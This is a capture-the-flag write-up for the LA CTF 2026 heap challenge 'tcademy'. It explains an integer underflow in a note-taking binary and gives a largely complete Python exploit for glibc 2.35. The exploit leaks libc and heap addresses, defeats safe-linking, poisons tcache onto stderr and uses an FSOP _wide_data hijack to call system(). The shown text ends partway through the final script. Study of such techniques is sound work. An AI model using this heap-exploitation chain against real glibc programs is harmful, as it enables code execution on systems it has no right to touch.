# tcademy - LA CTF 2026 Writeup

**Category:** Pwn  
**Difficulty:** Hard  
**Flag:** `lactf{omg_arb_overflow_is_so_powerful}`  

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Reconnaissance](#reconnaissance)
3. [Static Analysis](#static-analysis)
4. [Finding the Vulnerability](#finding-the-vulnerability)
5. [Dynamic Analysis with pwndbg](#dynamic-analysis-with-pwndbg)
6. [Exploitation Strategy](#exploitation-strategy)
7. [Phase 1: Leaking libc](#phase-1-leaking-libc)
8. [Phase 2: Leaking Heap Base](#phase-2-leaking-heap-base)
9. [Phase 3: Tcache Poisoning](#phase-3-tcache-poisoning)
10. [Phase 4: FSOP Attack](#phase-4-fsop-attack)
11. [Common Confusions & FAQ](#common-confusions--faq)
12. [Final Exploit](#final-exploit)
13. [Commands Reference](#commands-reference)

---

## Challenge Overview

TCademy is a heap exploitation challenge featuring a simple note-taking application with only 2 note slots. The binary has full protections enabled (PIE, RELRO, NX, Canary) and uses glibc 2.35.

**Key constraints:**
- Only 2 note slots available
- Maximum note size: 0xF8 bytes
- Uses glibc 2.35-0ubuntu3.8 with safe-linking enabled

---

## Reconnaissance

### File Analysis

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, dynamically linked

$ checksec chall
[*] '/path/to/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Running the Binary

```bash
$ ./chall
_____________________________
|           MENU            |
| 1. Create and fill a note |
| 2. Delete a note          |
| 3. Read a note            |
| 4. Exit                   |
|___________________________|

Choice >
```

The application provides basic note management:
- Create note: Choose index (0-1), size, and data
- Delete note: Free the note at given index
- Read note: Print the note contents
- Exit: Terminate the program

---

## Static Analysis

### Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *notes[2] = {0};

int read_data_into_note(int index, char *note, unsigned short size) {
    // I prevented all off-by-one's by forcing the size to be at least 7 less
    // than what was declared by the user! I am so smart
    unsigned short resized_size = size == 8 ? (unsigned short)(size - 7) : (unsigned short)(size - 8);
    int bytes = read(0, note, resized_size);
    if (bytes < 0) {
        puts("Read error");
        exit(1);
    }
    if (note[bytes-1] == '\n') note[bytes-1] = '\x00';
}

void create_note() {
    int index = get_note_index();
    unsigned short size;
    if (notes[index] != NULL) {
        puts("Already allocated! Free the note first");
        return;
    }

    printf("Size: ");
    scanf("%hu", &size);
    if (size < 0 || size > 0xf8) {
        puts("Invalid size!!!");
        exit(1);
    }

    notes[index] = malloc(size);
    printf("Data: ");
    read_data_into_note(index, notes[index], size);
    puts("Note created!");
}

void delete_note() {
    int index = get_note_index();
    free(notes[index]);
    notes[index] = 0;
    puts("Note deleted!");
}

void print_note() {
    int index = get_note_index();
    puts(notes[index]);
}
```

---

## Finding the Vulnerability

### The Integer Underflow Bug

The vulnerability lies in the `read_data_into_note()` function:

```c
unsigned short resized_size = size == 8 ? (unsigned short)(size - 7) : (unsigned short)(size - 8);
```

**What happens with size = 0?**

```
size = 0 (unsigned short)
resized_size = (unsigned short)(0 - 8)
resized_size = (unsigned short)(-8)
resized_size = 0xFFF8  ← INTEGER UNDERFLOW!
```

This allows us to **write up to 0xFFF8 (65,528) bytes** even though we allocated 0 bytes!

### Why size = 0 works?

1. The size check allows 0: `if (size < 0 || size > 0xf8)` - size is unsigned, so `size < 0` is always false
2. malloc(0) returns a valid chunk (minimum size 0x20 bytes on x64)
3. The subtraction causes underflow: `0 - 8 = 0xFFF8` in unsigned arithmetic

### Testing the Vulnerability

```python
from pwn import *

r = process('./chall')

# Create chunk 0
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'0')
r.sendlineafter(b': ', b'24')
r.sendafter(b': ', b'A' * 24)

# Create chunk 1
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'1')
r.sendlineafter(b': ', b'24')
r.sendafter(b': ', b'B' * 24)

# Delete chunk 0
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b': ', b'0')

# Trigger overflow with size=0
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'0')
r.sendlineafter(b': ', b'0')  # size = 0 → overflow!
r.sendafter(b': ', b'C' * 100)  # Can write 0xFFF8 bytes!
```

---

## Dynamic Analysis with pwndbg

### Setting up pwndbg

```bash
# Start gdb with the binary
$ gdb ./chall

# In pwndbg:
pwndbg> set follow-fork-mode child
pwndbg> b *create_note
pwndbg> b *delete_note
pwndbg> b *read_data_into_note
pwndbg> run
```

### Examining Heap Layout

#### After allocating two chunks:

```
pwndbg> heap chunks
Addr                Size                  Flags
0x555555756000     0x290                  (top)
0x555555756290     0x20                   PREV_INUSE  ← Chunk 0
0x5555557562b0     0x20                   PREV_INUSE  ← Chunk 1
0x5555557562d0     0x20d40                PREV_INUSE  (top chunk)
```

#### After freeing chunk 0:

```
pwndbg> bins
tcachebins
0x20 [1]: 0x555555756290 ◂— 0x555000000000  (safe-linked!)
```

**Safe-linking in glibc 2.35:**
- fd pointer is mangled: `fd_stored = (chunk_addr >> 12) ^ next_ptr`
- Prevents easy heap leaks

#### Examining overflow:

```
pwndbg> x/40gx 0x555555756290
0x555555756290: 0x0000000000000000  0x0000000000000021  ← Chunk 0 metadata
0x5555557562a0: 0x4343434343434343  0x4343434343434343  ← Overflow data
0x5555557562b0: 0x4343434343434343  0x0000000000000021  ← Chunk 1 corrupted!
0x5555557562c0: 0x4242424242424242  0x0000000000000000
```

### Inspecting tcache:

```
pwndbg> tcache
{
  counts = {0, 1, 0, 0, ...},
  entries = {
    0x0,
    0x555555756290,  ← Points to our freed chunk
    0x0,
    ...
  }
}
```

### Viewing the overflow with context:

```
pwndbg> context
[DISASM]
   ► 0x5555555552f0 <read_data_into_note+X>    call   read

[STACK]
...

[BACKTRACE]
 ► 0x5555555552f0 read_data_into_note+X
   0x555555555400 create_note+X
   0x555555555500 main+X
```

---

## Exploitation Strategy

The exploit consists of 4 main phases:

1. **Leak libc base** - Forge an unsorted bin chunk to leak main_arena
2. **Leak heap base** - Use safe-linking to leak heap addresses
3. **Tcache poisoning** - Overwrite fd pointer to point to `_IO_2_1_stderr_`
4. **FSOP attack** - Hijack FILE structure to call `system(cmd)`

### Why these phases?

- **Only 2 slots:** Can't do traditional tcache filling (7 chunks)
- **glibc 2.35:** Has safe-linking protection, need to leak heap first
- **Full RELRO:** Can't overwrite GOT, need alternative RCE method
- **FSOP:** File Stream Oriented Programming allows arbitrary code execution

---

## Phase 1: Leaking libc

### Understanding Heap Bins

In glibc, freed chunks go to different bins based on size:

- **tcache bins:** Fast bins for sizes 0x20 - 0x410 (per-thread cache)
- **unsorted bin:** Temporary bin for larger chunks (size > 0x410)
- **large bins:** For very large allocations

When a chunk is freed to the **unsorted bin**, glibc writes pointers to `main_arena` (in libc) into the chunk's `fd` and `bk` fields!

### The Attack

1. Allocate two chunks: small (chunk 0) and large (chunk 1, size 0xF8)
2. Free chunk 0 → goes to tcache
3. Re-allocate chunk 0 with size=0 (trigger overflow)
4. Overflow overwrites chunk 1's **size field** from `0x101` to `0x421`
5. Free chunk 1 → glibc sees size `0x421` (> 0x410) → **unsorted bin!**
6. Glibc writes `main_arena` pointer into chunk 1's fd field
7. Re-allocate chunk 1 with small size (8 bytes)
8. Read chunk 1 → leak the fd pointer → **libc base address!**

### Code

```python
def leak_libc(io):
    # Step 1-2: Allocate chunks
    create(io, 0, 8, b"X")           # Small chunk
    create(io, 1, 0xF8, b"Y" * 8)    # Large chunk (0x100 actual size)

    # Step 3: Free chunk 0
    delete(io, 0)

    # Step 4: Overflow to forge fake chunk
    payload = bytearray(b"A" * 0x500)

    # Overwrite chunk 1's size to 0x421
    payload[0x10 : 0x10 + 16] = p64(0) + p64(0x421)

    # Fake next chunk to prevent consolidation
    payload[0x430 : 0x430 + 16] = p64(0) + p64(0x21)
    payload[0x450 : 0x450 + 16] = p64(0) + p64(0x21)

    # Step 5: Trigger overflow
    create(io, 0, 0, bytes(payload))

    # Step 6: Free chunk 1 → unsorted bin
    delete(io, 1)

    # Step 7-8: Reallocate and leak
    create(io, 1, 8, b"Z")
    leak_line = read_note_raw(io, 1).split(b"\n", 1)[0]

    # Parse the leak
    rest = leak_line[1:]  # Skip the 'Z'
    b = bytearray(8)
    b[0] = 0
    for i in range(min(len(rest), 7)):
        b[1 + i] = rest[i]
    if b[5] == 0:
        b[5] = 0x7F  # Fix null byte

    fd_page = u64(bytes(b)) & ~0xFFF
    libc_base = (fd_page - 0x21B000) & 0xFFFFFFFFFFFFFFFF
    return libc_base
```

### Why offset 0x10 for chunk 1's metadata?

**Heap layout:**
```
Offset from chunk0's user data:
0x00: Chunk 0 user data start
0x10: Chunk 0 ends, Chunk 1 metadata starts! ← 0x10 bytes later
      [prev_size: 8 bytes]
      [size: 8 bytes]      ← We overwrite this to 0x421
0x20: Chunk 1 user data start
```

### Why size = 0x421?

- Must be > 0x410 to go to unsorted bin (not tcache)
- Must have `PREV_INUSE` bit set (lowest bit = 1) → `0x420 | 0x1 = 0x421`
- Total chunk size 0x420 bytes

### Why the fake chunks at 0x430 and 0x450?

When freeing a chunk, glibc checks the **next chunk** to see if it can consolidate:

```c
// Simplified glibc logic
next_chunk = chunk + chunk->size;
if (!prev_inuse(next_chunk)) {
    consolidate_chunks(chunk, next_chunk);
}
```

We create fake "next chunks" with valid headers to:
1. Prevent consolidation (crashes)
2. Pass glibc's heap consistency checks

### pwndbg commands to verify:

```bash
# After freeing chunk 1
pwndbg> bins
unsortedbin
all: 0x555555756020 —▸ 0x7ffff7e1bbe0 (main_arena+96) ◂— 0x555555756020

pwndbg> x/4gx 0x555555756020
0x555555756020: 0x0000000000000000  0x0000000000000421  ← Our forged size!
0x555555756030: 0x00007ffff7e1bbe0  0x00007ffff7e1bbe0  ← main_arena pointers!

pwndbg> distance main_arena 0x7ffff7e1bbe0
0x7ffff7e1bbe0->main_arena is -0x60 bytes
```

---

## Phase 2: Leaking Heap Base

### Understanding Safe-Linking

In glibc 2.35+, tcache uses **safe-linking** to prevent easy exploitation:

```c
// When storing fd pointer:
fd_stored = (chunk_address >> 12) ^ next_pointer

// When reading fd pointer:
next_pointer = (chunk_address >> 12) ^ fd_stored
```

This prevents direct heap address leaks, but we can **reverse it**!

### The Math

If we free two adjacent chunks, we get:

```
chunk0->fd = (chunk0_addr >> 12) ^ chunk1_addr
chunk1->fd = (chunk1_addr >> 12) ^ NULL = (chunk1_addr >> 12)
```

We also know: `chunk1_addr = chunk0_addr + 0x20` (they're adjacent)

With these equations, we can **solve for the actual addresses**!

### Why do we need BOTH leaks?

**Problem:** The `>> 12` shift **loses the bottom 12 bits**!

```
chunk1_addr = 0x5555557572A0
chunk1_addr >> 12 = 0x000555555757

We lost 0x2A0! Could be:
- 0x555555757000
- 0x555555757001
- ...
- 0x555555757FFF  ← 4096 possibilities!
```

**Solution:** Use both leaks + the constraint that chunks are adjacent (0x20 apart) to uniquely solve for the addresses.

### Brute Force for Missing Bytes

When we read with `puts()`, it stops at null bytes:

```
fd value in memory: 0x00 0x55 0x55 0x55 0x75 0x57
puts() reads:       [stops at 0x00]
```

We only get partial data! Solution: **brute force** the missing first byte (only 256 possibilities).

### Code

```python
def solve_heap_from_leaks(leak0: bytes, leak1: bytes) -> int:
    leak0 = leak0.rstrip(b"\n")
    leak1 = leak1.rstrip(b"\n")

    known_m1 = {i: leak0[i] for i in range(1, len(leak0))}
    known_m2 = {i: leak1[i] for i in range(1, len(leak1))}

    nul_m1 = len(leak0)
    nul_m2 = len(leak1)

    candidates = []

    # Brute force first byte
    for b0_m1 in range(256):
        m1_bytes = bytearray(8)
        m1_bytes[0] = b0_m1
        for i, v in known_m1.items():
            if i < 8:
                m1_bytes[i] = v
        if 0 <= nul_m1 < 8:
            m1_bytes[nul_m1] = 0
            for j in range(nul_m1 + 1, 8):
                m1_bytes[j] = 0
        m1 = int.from_bytes(m1_bytes, "little")

        for b0_m2 in range(256):
            m2_bytes = bytearray(8)
            m2_bytes[0] = b0_m2
            for i, v in known_m2.items():
                if i < 8:
                    m2_bytes[i] = v
            if 0 <= nul_m2 < 8:
                m2_bytes[nul_m2] = 0
                for j in range(nul_m2 + 1, 8):
                    m2_bytes[j] = 0
            m2 = int.from_bytes(m2_bytes, "little")

            # Solve the equations
            # m2 = B >> 12
            # m1 = (C >> 12) ^ B, where C = B + 0x20
            for c12 in (m2, (m2 + 1) & 0xFFFFFFFFFFFFFFFF):
                b = m1 ^ c12

                # Verify constraints
                if (b >> 12) != m2:
                    continue
                if ((b + 0x20) >> 12) != c12:
                    continue
                if b & 0xF:  # Must be 16-byte aligned
                    continue
                if (b >> 40) == 0:  # Sanity check
                    continue
                candidates.append(b)

    if not candidates:
        raise RuntimeError("heap solve failed")

    # Prefer matching known heap offset
    preferred = [b for b in candidates if (b & 0xFFF) == 0x2A0]
    if len(preferred) == 1:
        return preferred[0]

    return candidates[0]

# Use it:
delete(io, 0)
delete(io, 1)
create(io, 0, 8, b"A")
leak0 = read_note_raw(io, 0).split(b"\n", 1)[0]
create(io, 1, 8, b"B")
leak1 = read_note_raw(io, 1).split(b"\n", 1)[0]

b_user = solve_heap_from_leaks(leak0, leak1)
v_user = (b_user + 0x40) & 0xFFFFFFFFFFFFFFFF
```

### pwndbg commands to verify:

```bash
# After freeing two chunks
pwndbg> heap chunks
0x555555756290: 0x0000000000000000  0x0000000000000021  ← Chunk 0 (freed)
0x5555557562a0: 0x0000555555757000  0x0000000000000000  ← fd (safe-linked!)
0x5555557562b0: 0x0000000000000000  0x0000000000000021  ← Chunk 1 (freed)
0x5555557562c0: 0x0000000555555757  0x0000000000000000  ← fd (safe-linked!)

# Manually decode safe-linking:
pwndbg> p/x 0x5555557562a0 >> 12
$1 = 0x555555756

pwndbg> p/x 0x555555757000 ^ 0x555555756
$2 = 0x5555557562b0  ← Points to chunk 1!
```

---

## Phase 3: Tcache Poisoning

### What is Tcache Poisoning?

Tcache is a singly-linked list of freed chunks:

```
tcache[0x100]: chunk_A → chunk_B → chunk_C → NULL
```

If we can **overwrite chunk_B's fd pointer** to an arbitrary address:

```
tcache[0x100]: chunk_A → chunk_B → ARBITRARY_ADDR
```

Then:
```
malloc(0xF8) → returns chunk_A
malloc(0xF8) → returns chunk_B
malloc(0xF8) → returns ARBITRARY_ADDR! ← Arbitrary write!
```

### Target: _IO_2_1_stderr_

We want to allocate a chunk at the address of `stderr` (a FILE structure in libc):

```c
// In libc at fixed offset:
FILE _IO_2_1_stderr_;  // @ libc_base + 0x21B6A0
```

Why stderr?
- Known address (libc_base + offset)
- Gets flushed on program exit
- Contains function pointers we can hijack

### Creating the Mangled Pointer

We need to create a safe-linked pointer that points to stderr:

```python
def protect_ptr(pos: int, ptr: int) -> int:
    # Safe-linking: fd = (position >> 12) ^ pointer
    return ((pos >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF

stderr_addr = libc_base + 0x21B6A0
mangled = protect_ptr(v_user, stderr_addr)
```

This creates a fd value that, when stored at position `v_user`, will decode to `stderr_addr`.

### The Attack

```python
# Setup: Allocate and free two 0x100 chunks
delete(io, 1)
delete(io, 0)

create(io, 0, 0xF8, b"V" * 8)
create(io, 1, 0xF8, b"W" * 8)

delete(io, 1)  # tcache[0x100]: chunk1 → NULL
delete(io, 0)  # tcache[0x100]: chunk0 → chunk1 → NULL

# Poison: Overflow to overwrite chunk0's fd
mangled = protect_ptr(v_user, stderr_addr)
overflow = b"A" * 0x20 + p64(mangled)
create(io, 0, 0, overflow)  # Re-allocate chunk0, write overflow

delete(io, 0)  # Free chunk0 again

# Now tcache is poisoned!
# tcache[0x100]: chunk0 → (points to stderr via mangled ptr)
```

### pwndbg commands to verify:

```bash
# Check tcache state
pwndbg> tcache
{
  counts = {..., 1, ...},  ← One chunk in 0x100 bin
  entries = {
    ...
    0x555555756290,  ← Our poisoned chunk
    ...
  }
}

# Check the fd pointer
pwndbg> x/4gx 0x555555756290
0x555555756290: 0x0000000000000000  0x0000000000000101  ← Metadata
0x5555557562a0: 0x00007fffc0021b6a  0x0000000000000000  ← Poisoned fd!

# Decode safe-linking to verify it points to stderr
pwndbg> p/x (0x555555756290 >> 12) ^ 0x00007fffc0021b6a
$1 = 0x7ffff7e1b6a0  ← stderr address in libc!
```

---

## Phase 4: FSOP Attack

### What is FSOP?

**FSOP** (File Stream Oriented Programming) is a technique to hijack execution by exploiting FILE structures.

FILE structures (like `stdin`, `stdout`, `stderr`) contain:
- Data buffers
- State flags
- **Function pointer table (vtable)**

### FILE Structure Layout

```c
struct _IO_FILE {
    int _flags;                     // 0x00
    char *_IO_read_ptr;             // 0x08
    char *_IO_read_end;             // 0x10
    char *_IO_read_base;            // 0x18
    char *_IO_write_base;           // 0x20
    char *_IO_write_ptr;            // 0x28
    char *_IO_write_end;            // 0x30
    char *_IO_buf_base;             // 0x38
    char *_IO_buf_end;              // 0x40
    // ... more fields ...
    struct _IO_wide_data *_wide_data;  // 0xA0
    // ...
    int _mode;                         // 0xC0
    // ...
    struct _IO_jump_t *vtable;         // 0xD8
};

struct _IO_jump_t {
    // ... function pointers ...
    void (*__overflow)(FILE *, int);
    // ...
};
```

### The Attack Flow

When the program exits, glibc calls:

```c
fflush_all() {
    for each FILE* in _IO_list_all:
        if (FILE->_mode > 0):  // Wide-oriented mode
            call wide-character flush functions
}
```

For wide-oriented FILE streams, it eventually calls:

```c
_IO_wfile_overflow(FILE *fp, ...) {
    if (fp->_wide_data->_IO_buf_base == NULL) {
        _IO_wdoallocbuf(fp);  // ← Allocate buffer
    }
}

_IO_wdoallocbuf(FILE *fp) {
    fp->_wide_data->_wide_vtable->__doallocate(fp);  // ← Call function pointer!
}
```

If we control:
1. `stderr` (via tcache poisoning)
2. `stderr->_wide_data` (point to our controlled data)
3. `_wide_data->_wide_vtable` (point to our fake vtable)
4. `fake_vtable[0x68]` (offset of __doallocate)

We can hijack execution!

### Building the Fake Structures

**Step 1: Allocate wide_data (chunk 0)**

```python
wide_data_addr = v_user
wide_data = bytearray(b"\x00" * 0xF0)

# Wide data fields
struct.pack_into("<Q", wide_data, 0x18, 0)      # _IO_write_base
struct.pack_into("<Q", wide_data, 0x20, 1)      # _IO_write_ptr
struct.pack_into("<Q", wide_data, 0x30, 0)      # _IO_buf_base = NULL (trigger!)

# Fake wide vtable
struct.pack_into("<Q", wide_data, 0xE0, wide_data_addr + 0x80)  # _wide_vtable
struct.pack_into("<Q", wide_data, 0xE8, system_addr)  # vtable[0x68] = system!

create(io, 0, 0xF8, bytes(wide_data))
```

**Step 2: Allocate fake FILE at stderr (chunk 1)**

```python
cmd = b"echo;cat /app/flag.txt"

fake = bytearray(b"\x00" * 0xE0)
fake[: len(cmd)] = cmd  # Command at start of FILE!
fake[len(cmd)] = 0

buf = wide_data_addr + 0x60
struct.pack_into("<Q", fake, 0x20, buf)      # _IO_write_base
struct.pack_into("<Q", fake, 0x28, buf + 1)  # _IO_write_ptr (trigger flush)
struct.pack_into("<Q", fake, 0x30, buf + 8)  # _IO_write_end
struct.pack_into("<Q", fake, 0x38, buf)      # _IO_buf_base
struct.pack_into("<Q", fake, 0x40, buf + 8)  # _IO_buf_end

lock_addr = wide_data_addr + 0x40
struct.pack_into("<Q", fake, 0x88, lock_addr)     # _lock
struct.pack_into("<Q", fake, 0xA0, wide_data_addr) # _wide_data pointer
struct.pack_into("<I", fake, 0xC0, 1)             # _mode = 1 (wide-oriented!)
struct.pack_into("<Q", fake, 0xD8, wfile_jumps_addr)  # vtable

create(io, 1, 0xF8, bytes(fake))
```

**Step 3: Trigger exit**

```python
choice(io, 4)  # Exit
```

### Why This Works

1. Program exits → `fflush_all()` called
2. Glibc flushes `stderr`
3. Checks `stderr->_mode > 0` → **True!** (we set it to 1)
4. Calls wide-character functions
5. Checks `stderr->_wide_data->_IO_buf_base == NULL` → **True!** (we set it)
6. Calls `_IO_wdoallocbuf(stderr)`
7. Calls `stderr->_wide_data->_wide_vtable->__doallocate(stderr)`
8. This is at address `wide_data_addr + 0x80 + 0x68 = wide_data_addr + 0xE8`
9. We placed `system` at this offset!
10. Calls `system(stderr)`
11. stderr starts with our command: `"echo;cat /app/flag.txt"`
12. **SHELL EXECUTION!** → Flag!

### pwndbg commands to verify:

```bash
# Check stderr location
pwndbg> p _IO_2_1_stderr_
$1 = {
  _flags = 0x6f6863,  # "echo" in ASCII!
  ...
  _mode = 1,
  ...
}

# Check our fake wide_data
pwndbg> x/32gx wide_data_addr
...
0x...+0xE8: 0x00007ffff7c50d70  ← system address!

# Step through the exit
pwndbg> b *_IO_wdoallocbuf
pwndbg> c
pwndbg> ni
# ... eventually hits system() call
```

---

## Common Confusions & FAQ

### Q1: How does allocation work - by size or index?

**A:** The index (0 or 1) is just which slot in the `notes[]` array. The actual memory location is determined by `malloc()` based on available chunks in tcache/bins.

```c
char *notes[2];  // Just an array of pointers

create(0, 8, data)  → notes[0] = malloc(8)    // Could be at 0x1000
create(1, 24, data) → notes[1] = malloc(24)   // Could be at 0x1020
delete(0)           → free(notes[0]), notes[0] = NULL
create(0, 48, data) → notes[0] = malloc(48)   // NEW chunk, maybe at 0x1050!
```

### Q2: Why do we need to leak both chunk0 and chunk1 for heap leak?

**A:** Because safe-linking shifts right by 12 bits, losing the bottom 12 bits!

```
chunk1->fd = (chunk1_addr >> 12) → only gives us top 52 bits
```

From one leak alone, we have 4096 possibilities (2^12). Using both leaks and knowing they're adjacent (0x20 apart), we can uniquely solve for the addresses.

### Q3: Why forge size 0x421 specifically?

**A:**
- Must be > 0x410 to bypass tcache and go to unsorted bin
- Unsorted bin chunks have fd/bk pointers to main_arena → libc leak!
- Lowest bit must be 1 (PREV_INUSE flag) → 0x420 | 0x1 = 0x421

### Q4: Why do we need fake chunks at offsets 0x430 and 0x450?

**A:** When freeing a chunk, glibc looks for the "next chunk" to check if it can consolidate:

```c
next_chunk = current_chunk + current_chunk->size;
```

We create fake chunk headers so glibc doesn't crash when it checks these addresses.

### Q5: How do we know the mangled_stderr address?

**A:**
- We leaked `libc_base` in Phase 1
- `stderr_addr = libc_base + 0x21B6A0` (fixed offset in glibc 2.35)
- We leaked heap addresses in Phase 2 (v_user)
- `mangled = (v_user >> 12) ^ stderr_addr` (safe-linking formula)

### Q6: What is struct.pack_into?

**A:** Python function to write binary data at specific offsets:

```python
buf = bytearray(16)
struct.pack_into("<Q", buf, 0, 0x4141414141414141)
# Writes 8 bytes (little-endian) at offset 0
# buf is now: b"AAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00"
```

Format codes:
- `<Q` = little-endian 64-bit unsigned (8 bytes)
- `<I` = little-endian 32-bit unsigned (4 bytes)
- `<` = little-endian (x86/x64 byte order)

### Q7: Why can't we just overwrite __free_hook?

**A:** The binary has **Full RELRO** (RELocation Read-Only), which makes:
- GOT (Global Offset Table) read-only
- __free_hook, __malloc_hook also read-only in modern glibc

We need alternative RCE methods like FSOP.

### Q8: How does the overflow work if we only send 0x28 bytes?

**A:** The size=0 triggers `read(fd, buf, 0xFFF8)` which can read UP TO 0xFFF8 bytes. We send a smaller payload (0x28 bytes), which is still enough to overflow into adjacent chunks.

---

## Final Exploit

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import struct

from pwn import PIPE, STDOUT, context, process, remote


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def u64(b: bytes) -> int:
    return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def protect_ptr(pos: int, ptr: int) -> int:
    # glibc safe-linking (PROTECT_PTR): fd = (pos >> 12) ^ ptr
    return ((pos >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF


MENU_HDR = b"_____________________________\n"


def choice(io, n: int) -> None:
    io.sendlineafter(b"Choice > ", str(n).encode())


def create(io, idx: int, size: int, data: bytes) -> None:
    choice(io, 1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Data: ", data)
    io.recvuntil(b"Note created!\n")


def delete(io, idx: int) -> None:
    choice(io, 2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Note deleted!\n")


def read_note_raw(io, idx: int) -> bytes:
    choice(io, 3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    out = io.recvuntil(MENU_HDR)
    return out[: -len(MENU_HDR)]


def solve_heap_from_leaks(leak0: bytes, leak1: bytes) -> int:
    leak0 = leak0.rstrip(b"\n")
    leak1 = leak1.rstrip(b"\n")

    known_m1 = {i: leak0[i] for i in range(1, len(leak0))}
    known_m2 = {i: leak1[i] for i in range(1, len(leak1))}

    nul_m1 = len(leak0)
    nul_m2 = len(leak1)

    candidates: list[int] = []

    for b0_m1 in range(256):
        m1_bytes = bytearray(8)
        m1_bytes[0] = b0_m1
        for i, v in known_m1.items():
            if i < 8:
                m1_bytes[i] = v
        if 0 <= nul_m1 < 8:
            m1_bytes[nul_m1] = 0
            for j in range(nul_m1 + 1, 8):
                m1_bytes[j] = 0
        m1 = int.from_bytes(m1_bytes, "little")

        for b0_m2 in range(256):
            m2_bytes = bytearray(8)
            m2_bytes[0] = b0_m2
            for i, v in known_m2.items():
                if i < 8:
                    m2_bytes[i] = v
            if 0 <= nul_m2 < 8:
                m2_bytes[nul_m2] = 0
                for j in range(nul_m2 + 1, 8):
                    m2_bytes[j] = 0
            m2 = int.from_bytes(m2_bytes, "little")

            # Leak layout:
            #   free(B), free(C=B+0x20), then allocate C (leak0) then B (leak1)
            #
            # So:
            #   m2 = PROTECT_PTR(B, NULL) = B>>12
            #   m1 = PROTECT_PTR(C, B)    = (C>>12) ^ B, with C=B+0x20
            #
            # Page-boundary edge case: (B+0x20)>>12 can equal B>>12 or B>>12+1.
            for c12 in (m2, (m2 + 1) & 0xFFFFFFFFFFFFFFFF):
                b = m1 ^ c12
                if (b >> 12) != m2:
                    continue
                if ((b + 0x20) >> 12) != c12:
                    continue
                if b & 0xF:
                    continue
                if (b >> 40) == 0:
                    continue
                candidates.append(b)

    if not candidates:
        raise RuntimeError("heap solve failed")

    # Prefer the candidate matching the first-user-chunk offset in this binary/glibc.
    preferred = [b for b in candidates if (b & 0xFFF) == 0x2A0]
    if len(preferred) == 1:
        return preferred[0]

    return candidates[0]


def leak_libc(io) -> int:
    create(io, 0, 8, b"X")
    create(io, 1, 0xF8, b"Y" * 8)
    delete(io, 0)

    payload = bytearray(b"A" * 0x500)
    payload[0x10 : 0x10 + 16] = p64(0) + p64(0x421)
    payload[0x430 : 0x430 + 16] = p64(0) + p64(0x21)
    payload[0x450 : 0x450 + 16] = p64(0) + p64(0x21)

    create(io, 0, 0, bytes(payload))
    delete(io, 1)

    create(io, 1, 8, b"Z")
    leak_line = read_note_raw(io, 1).split(b"\n", 1)[0]
    if not leak_line.startswith(b"Z"):
        raise RuntimeError(f"unexpected libc leak line: {leak_line!r}")

    rest = leak_line[1:]
    if len(rest) < 3:
        raise RuntimeError(f"libc leak too short: {leak_line!r}")
    b = bytearray(8)
    b[0] = 0
    for i in range(min(len(rest), 7)):
        b[1 + i] = rest[i]
    if b[5] == 0:
        b[5] = 0x7F
    fd_page = u64(bytes(b)) & ~0xFFF
    return (fd_page - 0x21B000) & 0xFFFFFFFFFFFFFFFF


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--remote", action="store_true")
    ap.add_argument("--host", default="chall.lac.tf")
    ap.add_argument("--port", type=int, default=31144)
    args = ap.parse_args()

    context.log_level = "error"

    if args.remote:
        io = remote(args.host, args.port)
        cmd = b"echo;cat /app/flag.txt"
    else:
        io = process(
            [
                "./ld-2.35.so",
                "--library-path",
                ".",
                "./chall",
            ],
            stdin=PIPE,
            stdout=PIPE,
            stderr=STDOUT,
        )
        cmd = b"echo;cat flag.txt"

    try:
        libc_base = leak_libc(io)

        # glibc 2.35-0ubuntu3.8 offsets
        SYSTEM_OFF = 0x50D70
        IO_WFILE_JUMPS_OFF = 0x2170C0
        STDERR_OFF = 0x21B6A0

        system_addr = libc_base + SYSTEM_OFF
        wfile_jumps_addr = libc_base + IO_WFILE_JUMPS_OFF
        stderr_addr = libc_base + STDERR_OFF

        # Heap leak from the two adjacent 0x20 chunks.
        delete(io, 0)
        delete(io, 1)
        create(io, 0, 8, b"A")
        leak0 = read_note_raw(io, 0).split(b"\n", 1)[0]
        create(io, 1, 8, b"B")
        leak1 = read_note_raw(io, 1).split(b"\n", 1)[0]

        b_user = solve_heap_from_leaks(leak0, leak1)
        v_user = (b_user + 0x40) & 0xFFFFFFFFFFFFFFFF  # start of the unsorted remainder

        # Phase: poison a 0x110 tcache entry to land an allocation on _IO_2_1_stderr_.
        delete(io, 1)
        delete(io, 0)

        create(io, 0, 0xF8, b"V" * 8)
        create(io, 1, 0xF8, b"W" * 8)

        delete(io, 1)
        delete(io, 0)

        mangled = protect_ptr(v_user, stderr_addr)
        overflow = b"A" * 0x20 + p64(mangled)
        create(io, 0, 0, overflow)
        delete(io, 0)

        # wide_data lives in V.
        wide_data_addr = v_user
        wide_data = bytearray(b"\x00" * 0xF0)
        struct.pack_into("<Q", wide_data, 0x18, 0)  # write_base
        struct.pack_into("<Q", wide_data, 0x20, 1)  # write_ptr
        struct.pack_into("<Q", wide_data, 0x30, 0)  # buf_base (must be NULL)
        struct.pack_into("<Q", wide_data, 0xE0, wide_data_addr + 0x80)  # _wide_vtable
        struct.pack_into("<Q", wide_data, 0xE8, system_addr)  # wide_vtable+0x68 -> system
        create(io, 0, 0xF8, bytes(wide_data))

        # Allocate poisoned -> stderr and write fake FILE there.
        if not cmd or (cmd[0] & 0x2):
            raise ValueError("cmd[0] must have bit1 cleared")
